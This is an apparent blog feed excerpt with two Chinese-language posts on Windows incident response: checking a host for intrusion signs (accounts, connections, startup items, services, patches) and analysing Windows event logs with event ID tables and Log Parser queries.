  <entry>
    <title>Windows入侵排查</title>
    <url>/post/fbbd4eb4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1、什么是应急响应"><a href="#1、什么是应急响应" class="headerlink" title="1、什么是应急响应"></a>1、什么是应急响应</h2><p>“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。（百度）</p>
<h2 id="2、常见攻击类型"><a href="#2、常见攻击类型" class="headerlink" title="2、常见攻击类型"></a>2、常见攻击类型</h2><p>（1）WEB入侵：挂马，网页篡改，植入webshell，黑页，暗链等</p>
<p>（2）主机入侵：病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等</p>
<p>（3）网络攻击：DDOS/CC攻击，ARP攻击，DNS/HTTP劫持</p>
<p>（4）路由器/交换机攻击：内网病毒，配置错误，机器本身的漏洞等</p>
<h1 id="二、Windows入侵排查思路"><a href="#二、Windows入侵排查思路" class="headerlink" title="二、Windows入侵排查思路"></a>二、Windows入侵排查思路</h1><h2 id="1、检查系统账号安全"><a href="#1、检查系统账号安全" class="headerlink" title="1、检查系统账号安全"></a>1、检查系统账号安全</h2><p>（1）查看服务器是否有<strong>弱口令</strong>，<strong>远程管理端口</strong>是否对公网开放</p>
<p>&emsp;&emsp;据实际情况咨询相关服务器管理员。</p>
<p>（2）查看服务器是否存在<strong>可疑账号</strong>、<strong>新增账号</strong>。</p>
<ul>
<li>黑客获得shell后，通常会新建一个用户用来登陆远程桌面。我们可以在命令行中输入<code>net user</code>查看当前计算机等等用户有无增加</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430672838-edca98a7-39d0-4d64-907f-70584b20b619.png" alt="img"></p>
<ul>
<li>在运行中输入<code>mmc</code>打开控制台，选择文件-&gt;添加/删除管理单元-&gt;本地用户和组。（也可以在cmd 窗口，输入 <code>lusrmgr.msc</code> 命令）</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430699431-e04d9517-08d8-4fdb-a26b-1d566bc7ce37.png" alt="img"></p>
<p>（3）查看服务器是否存在<strong>隐藏账号</strong>、<strong>克隆账号</strong>。</p>
<ul>
<li>打开注册表 ，查看管理员对应键值。</li>
<li>使用D盾_web查杀工具，集成了对克隆账号检测的功能。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648454851745-8344d74d-94d9-41cf-ad29-cc88b058d01d.png" alt="img"></p>
<p>（4）结合日志，查看<strong>管理员登录时间</strong>、<strong>用户名</strong>是否存在异常。</p>
<ul>
<li>Win+R 打开运行，输入”<code>eventvwr.msc</code>“，回车运行，打开“事件查看器”。</li>
<li>导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648454988003-afe80f5d-df3c-4cbf-9d9a-972cc3ac67f1.png" alt="img"></p>
<h2 id="2、检查网络状态、进程"><a href="#2、检查网络状态、进程" class="headerlink" title="2、检查网络状态、进程"></a>2、检查网络状态、进程</h2><p>（1）检查端口连接情况，是否有<strong>远程连接</strong>、<strong>可疑连接</strong>。</p>
<ul>
<li>使用<code>netstat -ano</code>命令查看目前的网络连接，定位可疑的 ESTABLISHED</li>
<li>根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist | findstr &quot;PID&quot;</code></li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648455341329-9a45a932-9da9-42f8-b5b1-f642354e5702.png" alt="img"></p>
<p>（2）查看<strong>hosts</strong>文件是否被修改，hosts文件的存放位置为<code>C:\Windows\System32\drivers\etc</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648431124586-88073ce8-4348-4ec4-810f-31b094833888.png" alt="img"></p>
<p>（3）<strong>进程</strong></p>
<ul>
<li>开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648455607120-72a7743e-e77c-4b88-aae5-edbbc18d805a.png" alt="img"></p>
<ul>
<li>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</li>
<li>通过微软官方提供的 Process Explorer 等工具进行排查 。</li>
<li>查看可疑的进程及其子进程。可以通过观察以下内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有签名验证信息的进程</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的属主</span><br><span class="line">进程的路径是否合法</span><br><span class="line">CPU 或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>小技巧</strong></li>
</ol>
<ul>
<li>查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></li>
<li>查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist | findstr &quot;PID&quot;</code></li>
<li>查看进程对应的程序位置：任务管理器 – 选择对应进程 – 右键打开文件位置；或者运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></li>
<li><code>tasklist /svc</code>   进程 – PID – 服务</li>
<li>查看Windows服务所对应的端口：<code>%systemroot%/system32/drivers/etc/services</code>（一般 %systemroot% 就是 C:\Windows 路径）</li>
</ul>
<h2 id="3、检查启动项、计划任务、服务"><a href="#3、检查启动项、计划任务、服务" class="headerlink" title="3、检查启动项、计划任务、服务"></a>3、检查启动项、计划任务、服务</h2><h3 id="（1）检查启动项"><a href="#（1）检查启动项" class="headerlink" title="（1）检查启动项"></a>（1）检查启动项</h3><ul>
<li><p>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p>
</li>
<li><p>单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。Windows7上可以直接在这里看到开机的启动项，而现在Windows10需要在任务管理器中查看</p>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430038503-a15a692e-916a-427e-a3f1-6464a48e9079.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430077167-7e447610-9e82-424d-a9b3-8c5d35a950a0.png" alt="img"></p>
<ul>
<li>单击【开始】&gt;【运行】，输入 <code>regedit</code>，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项。 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>

<ul>
<li><p>利用安全软件查看启动项、开机时间管理等。</p>
</li>
<li><p>组策略，运行 <code>gpedit.msc</code></p>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648456704828-52f81e0d-8cb6-41c7-95f8-3bcef9e1093a.png" alt="img"></p>
<h3 id="（2）检查计划任务"><a href="#（2）检查计划任务" class="headerlink" title="（2）检查计划任务"></a>（2）检查计划任务</h3><ul>
<li>单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648456887103-6b7f4d72-802a-4431-9729-99b892ae2fe5.png" alt="img"></p>
<ul>
<li>单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648456922998-7fb42cb4-8302-4720-9866-8bcb829b14e8.png" alt="img"> </p>
<h3 id="（3）检查服务"><a href="#（3）检查服务" class="headerlink" title="（3）检查服务"></a>（3）检查服务</h3><p>单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。通常病毒都会藏着这里，并伪装名字</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648431435816-b8a0e80c-9b7b-4065-abe0-6bf09766471b.png" alt="img"></p>
<h2 id="4、查找可疑目录及文件"><a href="#4、查找可疑目录及文件" class="headerlink" title="4、查找可疑目录及文件"></a>4、查找可疑目录及文件</h2><ul>
<li>查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Window 2003版本 C:\Documents and Settings</span><br><span class="line">Window 2008R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure>

<ul>
<li>一般带有tmp/temp的都是存放临时文件的地方，也是一般病毒存在的地方。在运行输入<code>%temp%</code>查看<strong>临时文件</strong>，输入 <code>%UserProfile%\Recent</code>查看<strong>最近打开的文件</strong></li>
<li>在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</li>
<li>回收站、浏览器下载目录、浏览器历史记录</li>
<li>修改时间在创建时间之前的为可疑文件</li>
</ul>
<h2 id="5、漏洞与系统补丁"><a href="#5、漏洞与系统补丁" class="headerlink" title="5、漏洞与系统补丁"></a>5、漏洞与系统补丁</h2><p>有的黑客入侵后会故意卸载一些漏洞与系统补丁，来达到利用漏洞来进行持续控制的目的。在cmd中输入<code>systeminfo</code>即可查看计算机安装的补丁</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648431288264-aca3ece5-191b-450d-abbb-831a48402fa4.png" alt="img"></p>
<h2 id="6、发现并得到-WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？"><a href="#6、发现并得到-WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？" class="headerlink" title="6、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？"></a>6、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</h2><ul>
<li><p>利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p>
</li>
<li><p>利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
</li>
</ul>
<h2 id="7、日志分析"><a href="#7、日志分析" class="headerlink" title="7、日志分析"></a>7、日志分析</h2><p>日志会记录计算机的所有行为，所以黑客的行为会被记录在日志中，我们可以通过检查日志来查看自己的计算机是否正常。</p>
<h3 id="（1）系统日志"><a href="#（1）系统日志" class="headerlink" title="（1）系统日志"></a>（1）系统日志</h3><ul>
<li><p>前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
</li>
<li><p>打开运行输入<code>eventvwr.msc</code>即可查看日志。通过查看事件id来排查相关的操作行为</p>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430282904-db1f5ee9-6927-4e67-8e6e-d65e7e71968d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1102    清理审计日志</span><br><span class="line">4624    账号成功登录</span><br><span class="line">4625    账号登录失败</span><br><span class="line">4672    授予特殊权限</span><br><span class="line">4720    创建用户</span><br><span class="line">4726    删除用户</span><br><span class="line">4728    将成员添加到启用安全的全局组中</span><br><span class="line">4729    将成员从安全的全局组中移除</span><br><span class="line">4732    将成员添加到启用安全的本地组中</span><br><span class="line">4733    将成员从启用安全的本地组中移除</span><br><span class="line">4756    将成员添加到启用安全的通用组中</span><br><span class="line">4757    将成员从启用安全的通用组中移除</span><br><span class="line">4719    系统审计策略修改</span><br><span class="line">4768    Kerberos身份验证（TGT请求）</span><br><span class="line">4769    Kerberos服务票证请求</span><br><span class="line">4776    NTLM身份验证</span><br></pre></td></tr></table></figure>

<p>日志是可以清除的，但清除日志这一行为同样会被记录下来，所以检查日志就可以确认你的计算机在一段时间内是否正常。最好就是备份日志</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648430448319-b29d8b28-c305-4e2f-9cd1-83ff38dd9a36.png" alt="img"></p>
<ul>
<li>导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</li>
</ul>
<h3 id="（2）Web访问日志"><a href="#（2）Web访问日志" class="headerlink" title="（2）Web访问日志"></a>（2）Web访问日志</h3><ul>
<li><p>找到中间件的web日志，打包到本地方便进行分析。</p>
</li>
<li><p>推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p>
</li>
</ul>
<h1 id="三、工具篇"><a href="#三、工具篇" class="headerlink" title="三、工具篇"></a>三、工具篇</h1><h2 id="1、病毒分析"><a href="#1、病毒分析" class="headerlink" title="1、病毒分析"></a>1、病毒分析</h2><ul>
<li><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p>
</li>
<li><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p>
</li>
<li><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p>
</li>
<li><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p>
</li>
<li><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p>
</li>
<li><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p>
</li>
<li><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p>
</li>
</ul>
<h2 id="2、病毒查杀"><a href="#2、病毒查杀" class="headerlink" title="2、病毒查杀"></a>2、病毒查杀</h2><ul>
<li><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p>
</li>
<li><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p>
</li>
<li><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p>
</li>
<li><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p>
</li>
</ul>
<h2 id="3、病毒动态"><a href="#3、病毒动态" class="headerlink" title="3、病毒动态"></a>3、病毒动态</h2><ul>
<li><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p>
</li>
<li><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p>
</li>
<li><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p>
</li>
<li><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p>
</li>
<li><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p>
</li>
</ul>
<h2 id="4、在线病毒扫描网站"><a href="#4、在线病毒扫描网站" class="headerlink" title="4、在线病毒扫描网站"></a>4、在线病毒扫描网站</h2><ul>
<li><p>Virustotal：<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p>
</li>
<li><p>Virscan：<a href="http://www.virscan.org/">http://www.virscan.org</a></p>
</li>
<li><p>腾讯哈勃分析系统：<a href="https://habo.qq.com/">https://habo.qq.com</a></p>
</li>
<li><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p>
</li>
</ul>
<h2 id="5、webshell查杀"><a href="#5、webshell查杀" class="headerlink" title="5、webshell查杀"></a>5、webshell查杀</h2><ul>
<li>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></li>
<li>河马 WebShell 查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows日志分析</title>
    <url>/post/604d6f82.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Windows事件日志简介"><a href="#一、Windows事件日志简介" class="headerlink" title="一、Windows事件日志简介"></a>一、Windows事件日志简介</h1><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>Windows主要有以下三类日志记录系统事件：<strong>应用程序日志</strong>、<strong>系统日志</strong>和<strong>安全日志</strong>。</p>
<p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p>
<h2 id="1、系统日志"><a href="#1、系统日志" class="headerlink" title="1、系统日志"></a>1、系统日志</h2><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</p>
<p>默认位置： <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414430245-39fd0dfb-a715-493a-90f2-23f1db2afdf9.png" alt="img"></p>
<h2 id="2、应用程序日志"><a href="#2、应用程序日志" class="headerlink" title="2、应用程序日志"></a>2、应用程序日志</h2><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414514088-bf9e2a82-4518-4458-989d-4cfb46ddd5ad.png" alt="img"></p>
<h2 id="3、安全日志"><a href="#3、安全日志" class="headerlink" title="3、安全日志"></a>3、安全日志</h2><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414595022-4efb3202-cb46-4b1f-a032-47d46a96365f.png" alt="img"></p>
<h1 id="二、审核策略与事件查看器"><a href="#二、审核策略与事件查看器" class="headerlink" title="二、审核策略与事件查看器"></a>二、审核策略与事件查看器</h1><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p>
<p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414691846-9b051313-bec7-45c7-bd3b-5df282ae9a2a.png" alt="img"></p>
<p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414709392-ada71dc4-f3ae-4297-ae28-23a34f588245.png" alt="img"></p>
<h2 id="查看系统日志方法："><a href="#查看系统日志方法：" class="headerlink" title="查看系统日志方法："></a>查看系统日志方法：</h2><ol>
<li> 在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong> </li>
<li> 按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649414830841-67228323-ea85-4d38-acbb-3994994732e5.png" alt="img"></p>
<h1 id="三、事件日志分析"><a href="#三、事件日志分析" class="headerlink" title="三、事件日志分析"></a>三、事件日志分析</h1><p>对于Windows事件日志分析，不同的<code>EVENT ID</code>代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<table>
<thead>
<tr>
<th>事件ID</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>4624</td>
<td>登录成功</td>
</tr>
<tr>
<td>4625</td>
<td>登录失败</td>
</tr>
<tr>
<td>4634</td>
<td>注销成功</td>
</tr>
<tr>
<td>4647</td>
<td>用户启动的注销</td>
</tr>
<tr>
<td>4672</td>
<td>使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td>4720</td>
<td>创建用户</td>
</tr>
</tbody></table>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<table>
<thead>
<tr>
<th>登录类型</th>
<th>描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>交互式登录（Interactive）</td>
<td>用户在本地进行登录。</td>
</tr>
<tr>
<td>3</td>
<td>网络（Network）</td>
<td>最常见的情况就是连接到共享文件夹或共享打印机时。</td>
</tr>
<tr>
<td>4</td>
<td>批处理（Batch）</td>
<td>通常表明某计划任务启动。</td>
</tr>
<tr>
<td>5</td>
<td>服务（Service）</td>
<td>每种服务都被配置在某个特定的用户账号下运行。</td>
</tr>
<tr>
<td>7</td>
<td>解锁（Unlock）</td>
<td>屏保解锁。</td>
</tr>
<tr>
<td>8</td>
<td>网络明文（NetworkCleartext）</td>
<td>登录的密码在网络上是通过明文传输的，如FTP。</td>
</tr>
<tr>
<td>9</td>
<td>新凭证（NewCredentials）</td>
<td>使用带/Netonly参数的RUNAS命令运行一个程序。</td>
</tr>
<tr>
<td>10</td>
<td>远程交互，（RemoteInteractive）</td>
<td>通过终端服务、远程桌面或远程协助访问计算机。</td>
</tr>
<tr>
<td>11</td>
<td>缓存交互（CachedInteractive）</td>
<td>以一个域用户登录而又没有域控制器可用</td>
</tr>
</tbody></table>
<p>关于更多EVENT ID，详见微软官方网站上找到“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p>
<p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p>
<h2 id="案例1：利用eventlog事件来查看系统账号登录情况"><a href="#案例1：利用eventlog事件来查看系统账号登录情况" class="headerlink" title="案例1：利用eventlog事件来查看系统账号登录情况"></a>案例1：利用<code>eventlog</code>事件来查看系统账号登录情况</h2><ol>
<li> 在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>； </li>
<li> 在事件查看器中，单击<strong>“安全”</strong>，查看安全日志； </li>
<li>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。<br>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录 </li>
</ol>
<p>我们输入事件ID：<code>4625</code>进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649415095840-c017cecd-ac50-4cb8-879d-6f169f0821f2.png" alt="img"></p>
<h1 id="案例2：利用eventlog事件来查看计算机开关机的记录"><a href="#案例2：利用eventlog事件来查看计算机开关机的记录" class="headerlink" title="案例2：利用eventlog事件来查看计算机开关机的记录"></a>案例2：利用eventlog事件来查看计算机开关机的记录</h1><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p>
<p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p>
<p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p>
<p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>6005 信息 EventLog 事件日志服务已启动。(开机)<br>6006 信息 EventLog 事件日志服务已停止。(关机)<br>6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p>
<p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649415228466-7aa86000-4cb4-471f-b80d-e07b413f5e82.png" alt="img"></p>
<h1 id="四、日志分析工具"><a href="#四、日志分析工具" class="headerlink" title="四、日志分析工具"></a>四、日志分析工具</h1><h2 id="1、Log-Parser"><a href="#1、Log-Parser" class="headerlink" title="1、Log Parser"></a>1、Log Parser</h2><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p>
<p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649415263681-9b9aefb5-5433-4ae3-9549-f03fc846e1e0.png" alt="img"></p>
<h3 id="（1）基本查询结构"><a href="#（1）基本查询结构" class="headerlink" title="（1）基本查询结构"></a>（1）基本查询结构</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID <span class="string">&quot;SELECT * FROM c:\xx.evtx&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="（2）使用Log-Parser分析日志"><a href="#（2）使用Log-Parser分析日志" class="headerlink" title="（2）使用Log Parser分析日志"></a>（2）使用Log Parser分析日志</h3><h4 id="①-查询登录成功的事件"><a href="#①-查询登录成功的事件" class="headerlink" title="① 查询登录成功的事件"></a>① 查询登录成功的事件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe <span class="literal">-i</span>:EVT –o:DATAGRID  <span class="string">&quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span></span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe <span class="literal">-i</span>:EVT –o:DATAGRID  <span class="string">&quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span></span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe <span class="literal">-i</span>:EVT  –o:DATAGRID  <span class="string">&quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span></span><br></pre></td></tr></table></figure>

